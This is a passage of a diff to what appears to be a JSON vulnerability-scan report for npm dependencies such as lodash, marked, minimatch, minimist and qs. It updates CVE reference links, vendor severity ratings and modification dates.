+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
             "https://errata.almalinux.org/9/ALSA-2026-2452.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/lodash/lodash",
             "https://github.com/lodash/lodash/commit/edadd452146f7e4bad4ea684e955708931d84d81",
             "https://github.com/lodash/lodash/security/advisories/GHSA-xxjr-mmjv-4gpg",
@@ -32836,7 +32890,7 @@
             "https://www.cve.org/CVERecord?id=CVE-2025-13465"
           ],
           "PublishedDate": "2026-01-21T20:16:05.25Z",
-          "LastModifiedDate": "2026-02-17T17:10:07.52Z"
+          "LastModifiedDate": "2026-06-02T14:16:28.957Z"
         },
         {
           "VulnerabilityID": "CVE-2026-2950",
@@ -32926,8 +32980,7 @@
           ],
           "VendorSeverity": {
             "ghsa": 3,
-            "nvd": 3,
-            "ubuntu": 2
+            "nvd": 3
           },
           "CVSS": {
             "ghsa": {
@@ -32946,7 +32999,6 @@
             "https://github.com/chjj/marked/issues/937",
             "https://nodesecurity.io/advisories/531",
             "https://nvd.nist.gov/vuln/detail/CVE-2017-16114",
-            "https://www.cve.org/CVERecord?id=CVE-2017-16114",
             "https://www.npmjs.com/advisories/531"
           ],
           "PublishedDate": "2018-06-07T02:29:02.77Z",
@@ -33110,8 +33162,7 @@
           ],
           "VendorSeverity": {
             "ghsa": 2,
-            "nvd": 2,
-            "ubuntu": 2
+            "nvd": 2
           },
           "CVSS": {
             "ghsa": {
@@ -33131,7 +33182,6 @@
             "https://github.com/chjj/marked/pull/592/commits/2cff85979be8e7a026a9aca35542c470cf5da523",
             "https://nodesecurity.io/advisories/101",
             "https://nvd.nist.gov/vuln/detail/CVE-2016-10531",
-            "https://www.cve.org/CVERecord?id=CVE-2016-10531",
             "https://www.npmjs.com/advisories/101"
           ],
           "PublishedDate": "2018-05-31T20:29:01.033Z",
@@ -33167,8 +33217,7 @@
           ],
           "VendorSeverity": {
             "ghsa": 2,
-            "nvd": 2,
-            "ubuntu": 1
+            "nvd": 2
           },
           "CVSS": {
             "ghsa": {
@@ -33190,8 +33239,7 @@
             "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/BO2RMVVZVV6NFTU46B5RYRK7ZCXYARZS",
             "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/M6BJG6RGDH7ZWVVAUFBFI5L32RSMQN2S",
             "https://nvd.nist.gov/vuln/detail/CVE-2017-1000427",
-            "https://snyk.io/vuln/npm:marked:20170112",
-            "https://www.cve.org/CVERecord?id=CVE-2017-1000427"
+            "https://snyk.io/vuln/npm:marked:20170112"
           ],
           "PublishedDate": "2018-01-02T23:29:00.257Z",
           "LastModifiedDate": "2024-11-21T03:04:43.123Z"
@@ -33593,17 +33641,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/grafana/grafana-image-renderer/issues/329",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6",
@@ -33689,7 +33739,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
@@ -33815,7 +33865,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
@@ -33914,17 +33964,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/grafana/grafana-image-renderer/issues/329",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6",
@@ -34010,7 +34062,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
@@ -34136,7 +34188,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
@@ -34207,17 +34259,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/grafana/grafana-image-renderer/issues/329",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6",
@@ -34303,7 +34357,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
@@ -34429,7 +34483,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
@@ -34500,17 +34554,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/grafana/grafana-image-renderer/issues/329",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/a8763f4388e51956be62dc6025cec1126beeb5e6",
@@ -34596,7 +34652,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/2e111f3a79abc00fa73110195de2c0f2351904f5",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-3ppc-4f35-3m26",
@@ -34722,7 +34778,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27135",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-27904",
             "https://errata.almalinux.org/9/ALSA-2026-7896.html",
-            "https://errata.rockylinux.org/RLSA-2026:7896",
+            "https://errata.rockylinux.org/RLSA-2026:8339",
             "https://github.com/isaacs/minimatch",
             "https://github.com/isaacs/minimatch/commit/11d0df6165d15a955462316b26d52e5efae06fce",
             "https://github.com/isaacs/minimatch/security/advisories/GHSA-23c5-xmqv-rm74",
@@ -34793,17 +34849,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip",
             "https://github.com/advisories/GHSA-xvch-5gv4-984h",
             "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
@@ -34967,17 +35025,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip",
             "https://github.com/advisories/GHSA-xvch-5gv4-984h",
             "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
@@ -35141,17 +35201,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip",
             "https://github.com/advisories/GHSA-xvch-5gv4-984h",
             "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
@@ -35315,17 +35377,19 @@
             "https://bugzilla.redhat.com/2130518",
             "https://bugzilla.redhat.com/2134609",
             "https://bugzilla.redhat.com/2140911",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2044591",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2066009",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2130518",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2134609",
             "https://bugzilla.redhat.com/show_bug.cgi?id=2140911",
-            "https://bugzilla.redhat.com/show_bug.cgi?id=2142808",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2142821",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2150323",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44906",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0235",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-24999",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-3517",
-            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-35256",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548",
             "https://errata.almalinux.org/9/ALSA-2023-0321.html",
-            "https://errata.rockylinux.org/RLSA-2023:0321",
+            "https://errata.rockylinux.org/RLSA-2023:0050",
             "https://github.com/Marynk/JavaScript-vulnerability-detection/blob/main/minimist%20PoC.zip",
             "https://github.com/advisories/GHSA-xvch-5gv4-984h",
             "https://github.com/minimistjs/minimist/commit/34e20b8461118608703d6485326abbb8e35e1703",
@@ -36425,7 +36489,8 @@
           "VendorSeverity": {
             "cbl-mariner": 3,
             "ghsa": 3,
-            "redhat": 2
+            "redhat": 2,
+            "ubuntu": 2
           },
           "CVSS": {
             "ghsa": {
@@ -36683,7 +36748,7 @@
             "https://www.npmjs.com/advisories/29"
           ],
           "PublishedDate": "2014-10-19T01:55:21.56Z",
-          "LastModifiedDate": "2025-04-12T10:46:40.837Z"
+          "LastModifiedDate": "2026-05-06T22:30:45.22Z"
         },
         {
           "VulnerabilityID": "CVE-2017-1000048",
@@ -36874,8 +36939,10 @@
             "CWE-20"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -36890,7 +36957,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2025-15284",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/ljharb/qs",
             "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
             "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
@@ -37114,8 +37199,10 @@
             "CWE-20"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -37130,7 +37217,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2025-15284",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/ljharb/qs",
             "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
             "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
@@ -37329,8 +37434,10 @@
             "CWE-20"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -37345,7 +37452,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2025-15284",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/ljharb/qs",
             "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
             "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
@@ -37481,8 +37606,10 @@
             "CWE-20"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -37497,7 +37624,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2025-15284",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/ljharb/qs",
             "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
             "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
@@ -37633,8 +37778,10 @@
             "CWE-20"
           ],
           "VendorSeverity": {
+            "alma": 3,
             "ghsa": 2,
-            "redhat": 3
+            "redhat": 3,
+            "rocky": 3
           },
           "CVSS": {
             "ghsa": {
@@ -37649,7 +37796,25 @@
             }
           },
           "References": [
+            "https://access.redhat.com/errata/RHSA-2026:18868",
             "https://access.redhat.com/security/cve/CVE-2025-15284",
+            "https://bugzilla.redhat.com/2425946",
+            "https://bugzilla.redhat.com/2430538",
+            "https://bugzilla.redhat.com/2431036",
+            "https://bugzilla.redhat.com/2431740",
+            "https://bugzilla.redhat.com/2433645",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2425946",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2430538",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431036",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2431740",
+            "https://bugzilla.redhat.com/show_bug.cgi?id=2433645",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-13465",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2025-15284",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23745",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-23950",
+            "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2026-24842",
+            "https://errata.almalinux.org/9/ALSA-2026-18868.html",
+            "https://errata.rockylinux.org/RLSA-2026:18868",
             "https://github.com/ljharb/qs",
             "https://github.com/ljharb/qs/commit/3086902ecf7f088d0d1803887643ac6c03d415b9",
             "https://github.com/ljharb/qs/security/advisories/GHSA-6rw7-vpxm-498p",
@@ -38304,7 +38469,7 @@
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32006",
             "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-32559",
             "https://errata.almalinux.org/9/ALSA-2023-5363.html",
-            "https://errata.rockylinux.org/RLSA-2023:5363",
+            "https://errata.rockylinux.org/RLSA-2023:5362",
             "https://github.com/advisories/GHSA-c2qf-rxjj-qqgw",
             "https://github.com/npm/node-semver",
             "https://github.com/npm/node-semver/blob/main/classes/range.js#L97-L104",
@@ -38398,7 +38563,7 @@
